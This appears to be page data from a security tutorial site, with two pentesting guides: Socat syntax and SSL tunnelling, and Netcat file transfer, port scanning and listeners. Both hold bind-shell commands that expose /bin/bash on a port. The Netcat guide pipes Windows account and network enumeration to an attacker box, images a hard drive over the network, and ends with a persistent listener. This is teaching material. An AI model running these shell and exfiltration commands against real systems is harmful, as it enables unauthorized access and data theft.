{"componentChunkName":"component---src-templates-blog-post-js","path":"/tutorials/socat/","result":{"pageContext":{"post":{"fields":{"slug":"/socat"},"excerpt":"socat [options] <address> <address> You have to provide both addresses for it to work, each address will be made up like this\n\nprotocol:ip…","frontmatter":{"date":"13th June 2022 ","title":"Socat","description":"In today's article, we will look at Socat. Socat is a network utility similar to Netcat. Socat supports IPv6 and SSL and is available for both Windows and Linux. The first thing you will notice with this tool is that it has a different syntax than what you are used to with Netcat or other standard Unix tools.","tags":"socat","posttype":"tutorial"},"body":"# Socat\n\n\n```\nsocat [options] <address> <address>\n```\n\nYou have to provide both addresses for it to work, each address will be made up like this\n```\nprotocol:ip:port\n```\n\nExamples showing the same functionality as Netcat\n\n```\nnc localhost 80\nsocat - TCP4:localhost:80 \nOR \nsocat STDIN TCP4:localhost:80\n\nnc -lp localhost 700\nsocat TCP4-LISTEN:700 STDOUT\n\nnc -lp localhost 700 -e /bin/bash\nsocat TCP4-LISTEN:700 EXEC:/bin/bash\n```\n\nWe can go beyond Netcat with some SSL examples, but first, we need to generate an SSL cert for the server. Generate an SSL cert\n```\nopenssl req -new -x509 -days 365 -nodes -out cert.pem -keyout cert.key\n```\n\nSSL server\n\n```\nsocat OPENSSL-LISTEN:443,cert=/cert.pem -\n```\n\nSSL client\n\n```\nsocat - OPENSSL:localhost:443\n```\n\nBoth addresses don’t have to use the same protocol, so you can do `ssl server -> non-ssl server`. You should also check out the options that you can apply, for example you can use fork to tell socat to listen and handle multiple clients.\n\n```\nsocat TCP4-LISTEN:5000,fork OPENSSL:localhost:443\n```\n\nFinally if you are tunnelling a connection between servers using socat you can use the -v option to print all the traffic to stdout."},"prev":null,"next":{"fields":{"slug":"/netcat"},"excerpt":"First some brief points about Netcat All official versions are free of chargeWorks natively on Linux.Works natively on Apple Mac OS X.W…","frontmatter":{"date":"8th June 2022 ","title":"Netcat","description":"This article looks at Netcat, a valuable tool in the pentesters toolbox. Hobbit released the original Netcat in 1995, but it hasn’t been maintained despite its popularity. It can sometimes be hard to find a copy of the v1.10 source code. The flexibility and usefulness of this tool prompted the Nmap Project to produce Ncat, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.","tags":"netcat","posttype":"tutorial"},"body":"\n# Netcat\n\nFirst some brief points about Netcat\n- All official versions are free of charge\n- Works natively on Linux.\n- Works natively on Apple Mac OS X.\n- Works natively on Microsoft Windows.\n- Features a command-line interface.\n- Source code available for inspection.\n- General-purpose tools\n- Packet crafting tools\n\nThe `ncat` tool is a much better option in place of netcat or nc. \n\nWe think `ncat` is better because of its support for multiple protocols and simultaneous connections and SSL.\n\n\n## Overview\n\nThis simple utility reads and writes data across TCP or UDP network connections. It is designed to be a reliable back-end tool to use directly or easily drive by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need, including port binding to accept incoming connections.\n\n> Netcat can operate in environments where you have low privileges, plus it is a standalone binary, meaning you can upload it to an environment and run it as is.\n> Be warned that file transfers using Netcat are not encrypted, anyone on the network can grab what you are sending, so use this only on trusted networks.\n\n## Standard Listen and Send\n\nsetup netcat in listening mode and save whatever is received to `in.txt`\n```\nroot@box:/tmp/netcat# nc -w 1 -l -p 3000 > in.txt\n```\n\nFrom the sending end, we can pipe in a file called `out.txt` and send it to our listener.\n```\nnc -w 3 [destination] 3000 < out.txt\n```\n\n## Piping input\n\nWe can send data by sending output through a pipe to Netcat. Here we are outputting a file, but it could be several items.\n```\nC:\\Documents and Settings\\user> type c:\\test.txt | c:\\nc.exe 192.168.2.8 3000 -w1\n```\n\nOn our kali box, we can set a while loop like follows.\n```\nroot@evilsaint:/pentesting/enum# while true; do nc -w 4 -lvp 4321 >> enum.txt; done\n```\n\nAnd we can pipe enumeration commands back to our box.\n```\nC:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12>ipconfig | nc64.exe 10.1.1.5 4321 -w 3\nC:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12>net user | nc64.exe 10.1.1.5 4321 -w 3\nC:\\Users\\labuser.ACME\\Desktop\\netcat-win32-1.12>net account | nc64.exe 10.1.1.5 4321 -w 3\n```\n\n## Send with Compression (Linux to Linux)\n\nOn the receiving end\n```\nnc -l -p 1234 | uncompress -c | tar xvfp -\n```\n\nOn the sending end\n```\ntar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234\n```\n\n## Sending a harddrive\n\nIt is possible using Netcat to pipe a hardrive\n\nOn the sender end run\n```\ndd if=/dev/hda3 | gzip -9 | nc -l 3333\n```\n\nOn the receiver end,\n```\nnc [destination] 3333 | pv -b > hd-image.img.gz\n```\n\n### Port Scanning with Netcat\n\nTCP scan of ports 3385 to 3395\n```\nnc -nvv -w 1 -z 10.0.0.1 3385-3395\n```\n\nUDP scan of ports 3385 to 3395\n```\nnc -unvv -w 1 -z 10.0.0.1 3385-3395\n```\n\nSmall Bash Loop to loop through all the ports from 1 to 65535 for one IP\n```\nfor i in $(seq 1 65535); do nc -nv -w 1 -z 10.0.0.1 $i ; done\n```\n\nSmall Bash Loop to loop through all the IPs on our subnet and scan for ports 21-25\n```\nfor i in {1..254}; do nc -vv -n -w 1 10.0.0.$i 21-25 -z; done\n```\n\n| Option | Description |\n| --- | --- |\n| -n | don't resolve first just use the IP address and don't try and use DNS to get a hostname |\n| -vv | single -v is verbose, double v -vv is extra verbosity. |\n| -u | UDP mode. |\n| -w | equals the timeout in seconds for net reads |\n| -z | Zero I/O mode used for scanning. |\n\n### Makeshift Permanent Netcat Listener\n\n`nohup` is a program you can use to run your application with such that its stdout/stderr can be sent to a file instead and such that closing the parent script won’t SIGHUP the child. However, you need to have the foresight to use it before starting the application. Because of how `nohup` works, you can’t just apply it to a running process.\n\n`disown` is a bash builtin that removes a shell job from the shell’s job list. This means that you can’t use `fg`, `bg` on it anymore, but more importantly, when you close your shell, it won’t hang or send a SIGHUP to that child anymore. Unlike `nohup`, disown is used after the process has been launched and backgrounded.\n\nMake a Netcat listener persistent.\n```\nwhile(1) nohup netcat -lvp 4444\n```"}}},"staticQueryHashes":["310218920"],"slicesMap":{}}